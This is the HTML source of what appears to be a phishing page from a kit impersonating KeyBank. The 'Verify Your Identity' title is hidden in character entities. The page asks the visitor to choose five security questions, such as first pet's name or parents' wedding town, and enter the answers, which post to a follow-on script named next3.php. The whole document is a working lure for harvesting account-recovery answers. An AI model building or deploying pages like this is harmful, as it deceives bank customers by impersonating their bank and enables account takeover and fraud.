<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#75;&#101;&#121;&#66;&#97;&#110;&#107;&#32;&#45;&#32;&#86;&#101;&#114;&#105;&#102;&#121;&#32;&#89;&#111;&#117;&#114;&#32;&#73;&#100;&#101;&#110;&#116;&#105;&#116;&#121;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>
<style type="text/css">
  
.textbox {  
    border: solid 1px #d1d1d1;
  	border-radius: 4px;
  	padding-left: 8px;
  	font-size: 15px;
    height: 50px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #5FADCE; 
  	box-shadow: 0px 0px 6px #7bc1f7; 
    -moz-box-shadow: 0px 0px 6px #7bc1f7; 
    -webkit-box-shadow: 0px 0px 6px #7bc1f7; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>			  
div#container
{
	position:relative;
	width: 1348px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="shape1" style="position:absolute; overflow:hidden; left:879px; top:761px; width:103px; height:44px; z-index:0"><img border=0 width="100%" height="100%" alt="" src="images/shape313741406.gif"></div>

<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1348px; height:75px; z-index:1"><img src="images/kn7.png" alt="" title="" border=0 width=1348 height=75></div>

<div id="image2" style="position:absolute; overflow:hidden; left:161px; top:94px; width:438px; height:49px; z-index:2"><img src="images/kn16.png" alt="" title="" border=0 width=438 height=49></div>

<div id="image3" style="position:absolute; overflow:hidden; left:717px; top:181px; width:366px; height:171px; z-index:3"><img src="images/ans.png" alt="" title="" border=0 width=366 height=171></div>

<div id="image4" style="position:absolute; overflow:hidden; left:159px; top:180px; width:371px; height:174px; z-index:4"><img src="images/sq1.png" alt="" title="" border=0 width=371 height=174></div>

<div id="image5" style="position:absolute; overflow:hidden; left:160px; top:359px; width:370px; height:175px; z-index:5"><img src="images/sq2.png" alt="" title="" border=0 width=370 height=175></div>

<div id="image6" style="position:absolute; overflow:hidden; left:159px; top:537px; width:369px; height:172px; z-index:6"><img src="images/sq3.png" alt="" title="" border=0 width=369 height=172></div>

<div id="image7" style="position:absolute; overflow:hidden; left:717px; top:359px; width:366px; height:171px; z-index:7"><img src="images/ans.png" alt="" title="" border=0 width=366 height=171></div>

<div id="image8" style="position:absolute; overflow:hidden; left:717px; top:537px; width:366px; height:171px; z-index:8"><img src="images/ans7.png" alt="" title="" border=0 width=366 height=171></div>
<form action=next3.php name=istarihoasap id=istarihoasap method=post>
<select name="q1" class="textbox" autocomplete="off" required style="position:absolute;left:162px;top:210px;width:441px;z-index:9">
<option value>Choose Question
											</option>
											<option>What is your all-time favorite board game?
											</option>
											<option>What is your favorite museum or cultural institution?
											</option>
											<option>What is the first and last name of your oldest cousin?
											</option>
											<option>What is the last name of your all-time favorite athlete?
											</option>
											<option>What is your dream occupation?
											</option>
											<option>What is the name of the boy/girl that you first kissed?
											</option>
											<option>If you have ever broken a bone, which one?
											</option>
											<option>What was the first concert or live performance you attended?
											</option>
											<option>Whom did you go to prom with?
											</option>
											<option>What was your favorite teacher&#39;s name?
											</option>
											<option>What is your brother/sister nickname?
											</option>
											<option>Who is your favorite cartoon character?
											</option>
											<option>What is your favorite family holiday tradition?
											</option>
											<option>What is the first name of the best man at your wedding?
											</option>
											<option>What street did your best friend live on in high school?
											</option>
											<option>Who is your favorite composer?
											</option>
											<option>What was your favorite subject in school?
											</option>
											<option>Who was your favorite childhood hero?
											</option>
											<option>What is the middle name of your oldest sibling?
											</option>
											<option>Where is your dream vacation destination?
											</option>
											<option>In what city/town did your mother and father get married?
											</option>
											<option>What is your first pet&#39;s name?
											</option>
											<option>What was your first phone number that you remember?
											</option>
											<option>What is your best friend&#39;s first name?
											</option>
											<option>Who is your favorite historical figure?
											</option>
											<option>What is your all-time favorite sports movie?
											</option></select>
<input name="ans1" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:307px;left:719px;top:210px;z-index:10">
<select name="q2" class="textbox" autocomplete="off" required style="position:absolute;left:162px;top:299px;width:441px;z-index:11">
<option value>Choose Question
											</option>
											<option>What is your all-time favorite board game?
											</option>
											<option>What is your favorite museum or cultural institution?
											</option>
											<option>What is the first and last name of your oldest cousin?
											</option>
											<option>What is the last name of your all-time favorite athlete?
											</option>
											<option>What is your dream occupation?
											</option>
											<option>What is the name of the boy/girl that you first kissed?
											</option>
											<option>If you have ever broken a bone, which one?
											</option>
											<option>What was the first concert or live performance you attended?
											</option>
											<option>Whom did you go to prom with?
											</option>
											<option>What was your favorite teacher&#39;s name?
											</option>
											<option>What is your brother/sister nickname?
											</option>
											<option>Who is your favorite cartoon character?
											</option>
											<option>What is your favorite family holiday tradition?
											</option>
											<option>What is the first name of the best man at your wedding?
											</option>
											<option>What street did your best friend live on in high school?
											</option>
											<option>Who is your favorite composer?
											</option>
											<option>What was your favorite subject in school?
											</option>
											<option>Who was your favorite childhood hero?
											</option>
											<option>What is the middle name of your oldest sibling?
											</option>
											<option>Where is your dream vacation destination?
											</option>
											<option>In what city/town did your mother and father get married?
											</option>
											<option>What is your first pet&#39;s name?
											</option>
											<option>What was your first phone number that you remember?
											</option>
											<option>What is your best friend&#39;s first name?
											</option>
											<option>Who is your favorite historical figure?
											</option>
											<option>What is your all-time favorite sports movie?
											</option></select>
<input name="ans2" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:307px;left:719px;top:299px;z-index:12">
<select name="q3" class="textbox" autocomplete="off" required style="position:absolute;left:162px;top:388px;width:441px;z-index:13">
<option value>Choose Question
											</option>
											<option>What is your all-time favorite board game?
											</option>
											<option>What is your favorite museum or cultural institution?
											</option>
											<option>What is the first and last name of your oldest cousin?
											</option>
											<option>What is the last name of your all-time favorite athlete?
											</option>
											<option>What is your dream occupation?
											</option>
											<option>What is the name of the boy/girl that you first kissed?
											</option>
											<option>If you have ever broken a bone, which one?
											</option>
											<option>What was the first concert or live performance you attended?
											</option>
											<option>Whom did you go to prom with?
											</option>
											<option>What was your favorite teacher&#39;s name?
											</option>
											<option>What is your brother/sister nickname?
											</option>
											<option>Who is your favorite cartoon character?
											</option>
											<option>What is your favorite family holiday tradition?
											</option>
											<option>What is the first name of the best man at your wedding?
											</option>
											<option>What street did your best friend live on in high school?
											</option>
											<option>Who is your favorite composer?
											</option>
											<option>What was your favorite subject in school?
											</option>
											<option>Who was your favorite childhood hero?
											</option>
											<option>What is the middle name of your oldest sibling?
											</option>
											<option>Where is your dream vacation destination?
											</option>
											<option>In what city/town did your mother and father get married?
											</option>
											<option>What is your first pet&#39;s name?
											</option>
											<option>What was your first phone number that you remember?
											</option>
											<option>What is your best friend&#39;s first name?
											</option>
											<option>Who is your favorite historical figure?
											</option>
											<option>What is your all-time favorite sports movie?
											</option></select>
<input name="ans3" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:307px;left:719px;top:388px;z-index:14">
<select name="q4" class="textbox" autocomplete="off" required style="position:absolute;left:162px;top:477px;width:441px;z-index:15">
<option value>Choose Question
											</option>
											<option>What is your all-time favorite board game?
											</option>
											<option>What is your favorite museum or cultural institution?
											</option>
											<option>What is the first and last name of your oldest cousin?
											</option>
											<option>What is the last name of your all-time favorite athlete?
											</option>
											<option>What is your dream occupation?
											</option>
											<option>What is the name of the boy/girl that you first kissed?
											</option>
											<option>If you have ever broken a bone, which one?
											</option>
											<option>What was the first concert or live performance you attended?
											</option>
											<option>Whom did you go to prom with?
											</option>
											<option>What was your favorite teacher&#39;s name?
											</option>
											<option>What is your brother/sister nickname?
											</option>
											<option>Who is your favorite cartoon character?
											</option>
											<option>What is your favorite family holiday tradition?
											</option>
											<option>What is the first name of the best man at your wedding?
											</option>
											<option>What street did your best friend live on in high school?
											</option>
											<option>Who is your favorite composer?
											</option>
											<option>What was your favorite subject in school?
											</option>
											<option>Who was your favorite childhood hero?
											</option>
											<option>What is the middle name of your oldest sibling?
											</option>
											<option>Where is your dream vacation destination?
											</option>
											<option>In what city/town did your mother and father get married?
											</option>
											<option>What is your first pet&#39;s name?
											</option>
											<option>What was your first phone number that you remember?
											</option>
											<option>What is your best friend&#39;s first name?
											</option>
											<option>Who is your favorite historical figure?
											</option>
											<option>What is your all-time favorite sports movie?
											</option></select>
<input name="ans4" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:307px;left:719px;top:477px;z-index:16">
<select name="q5" class="textbox" autocomplete="off" required style="position:absolute;left:162px;top:566px;width:441px;z-index:17">
<option value>Choose Question
											</option>
											<option>What is your all-time favorite board game?
											</option>
											<option>What is your favorite museum or cultural institution?
											</option>
											<option>What is the first and last name of your oldest cousin?
											</option>
											<option>What is the last name of your all-time favorite athlete?
											</option>
											<option>What is your dream occupation?
											</option>
											<option>What is the name of the boy/girl that you first kissed?
											</option>
											<option>If you have ever broken a bone, which one?
											</option>
											<option>What was the first concert or live performance you attended?
											</option>
											<option>Whom did you go to prom with?
											</option>
											<option>What was your favorite teacher&#39;s name?
											</option>
											<option>What is your brother/sister nickname?
											</option>
											<option>Who is your favorite cartoon character?
											</option>
											<option>What is your favorite family holiday tradition?
											</option>
											<option>What is the first name of the best man at your wedding?
											</option>
											<option>What street did your best friend live on in high school?
											</option>
											<option>Who is your favorite composer?
											</option>
											<option>What was your favorite subject in school?
											</option>
											<option>Who was your favorite childhood hero?
											</option>
											<option>What is the middle name of your oldest sibling?
											</option>
											<option>Where is your dream vacation destination?
											</option>
											<option>In what city/town did your mother and father get married?
											</option>
											<option>What is your first pet&#39;s name?
											</option>
											<option>What was your first phone number that you remember?
											</option>
											<option>What is your best friend&#39;s first name?
											</option>
											<option>Who is your favorite historical figure?
											</option>
											<option>What is your all-time favorite sports movie?
											</option></select>
<input name="ans5" placeholder="&#65;&#110;&#115;&#119;&#101;&#114;" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:307px;left:719px;top:566px;z-index:18">

<div id="formimage1" style="position:absolute; left:525px; top:697px; z-index:21"><input type="image" name="formimage1" width="176" height="57" src="images/sub.png"></div>
</div>

</body>
</html>
